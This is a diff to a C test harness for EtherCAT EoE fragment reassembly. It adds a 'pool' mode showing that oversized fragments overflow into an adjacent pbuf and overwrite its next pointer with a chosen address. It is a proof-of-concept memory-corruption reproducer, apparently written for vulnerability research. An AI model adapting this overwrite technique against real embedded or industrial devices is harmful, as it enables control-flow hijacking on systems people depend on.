@@ -37,8 +37,39 @@ static size_t recv_len;
 static int canary_mode;
 static uint8_t *canary;
 
+/* Stand-in for the upstream rtl_lwip_eoe callback, which uses an lwIP
+ * PBUF_POOL: pool objects are adjacent and each begins with a next pointer.
+ * This is a synthetic layout, not upstream lwIP or a live target. */
+struct fake_pbuf
+{
+   void *next;
+   void *payload;
+   uint16_t tot_len;
+   uint16_t len;
+   uint8_t flags;
+   uint8_t rsvd;
+   uint16_t ref;
+   uint8_t data[RXBUFSIZE];
+};
+static struct fake_pbuf pool[2];
+static const char marker_str[] = "SOES-POOL-MARKER";
+static int pool_mode;
+static int pool_initialized;
+
 static void get_buffer(eoe_pbuf_t *ebuf)
 {
+   if (pool_mode)
+   {
+      if (!pool_initialized)
+      {
+         memset(pool, 0, sizeof(pool));
+         pool_initialized = 1;
+      }
+      ebuf->pbuf = &pool[0];
+      ebuf->payload = pool[0].data;
+      ebuf->len = RXBUFSIZE;
+      return;
+   }
    ebuf->pbuf = NULL;
    ebuf->payload = malloc(RXBUFSIZE);
    ebuf->len = RXBUFSIZE;
@@ -53,7 +84,7 @@ static void get_buffer(eoe_pbuf_t *ebuf)
 
 static void free_buffer(eoe_pbuf_t *ebuf)
 {
-   if (!canary_mode)
+   if (!pool_mode && !canary_mode)
    {
       free(ebuf->payload);
    }
@@ -97,7 +128,9 @@ int main(int argc, char **argv)
       .fetch_send_buffer = fetch_send_buffer,
    };
    int nfrag = (argc > 1) ? atoi(argv[1]) : 7;
-   canary_mode = (argc > 2 && strcmp(argv[2], "canary") == 0);
+   const char *mode = (argc > 2) ? argv[2] : "";
+   canary_mode = (strcmp(mode, "canary") == 0);
+   pool_mode = (strcmp(mode, "pool") == 0);
    int i;
 
    EOE_config(&cfg);
@@ -126,12 +159,27 @@ int main(int argc, char **argv)
       eoe->eoeheader.frameinfo1 = frameinfo1;
       eoe->eoeheader.frameinfo2 = frameinfo2;
       memset(eoe->data, 0x41 + i, FRAGDATA);
+      if (pool_mode && i == nfrag - 1)
+      {
+         /* Bytes 16..23 of the last fragment land on pool[1].next:
+          * payload base + 576 + 16 = pool[0] + 616 = pool[1].next. */
+         uintptr_t addr = (uintptr_t) marker_str;
+         int k;
+         for (k = 0; k < 8; k++)
+         {
+            eoe->data[16 + k] = (uint8_t) (addr >> (8 * k));
+         }
+      }
 
       MBXcontrol[0].state = MBXstate_inclaim;
       ESCvar.xoe = 0;
       ESC_eoeprocess();
    }
 
-   printf("nfrag=%d recv_calls=%d last_len=%zu\n", nfrag, recv_calls, recv_len);
+   if (pool_mode)
+   {
+      printf("pool_next=%p marker=%p match=%d\n", pool[1].next,
+            (void *) marker_str, pool[1].next == (void *) marker_str);
+   }
    return 0;
 }
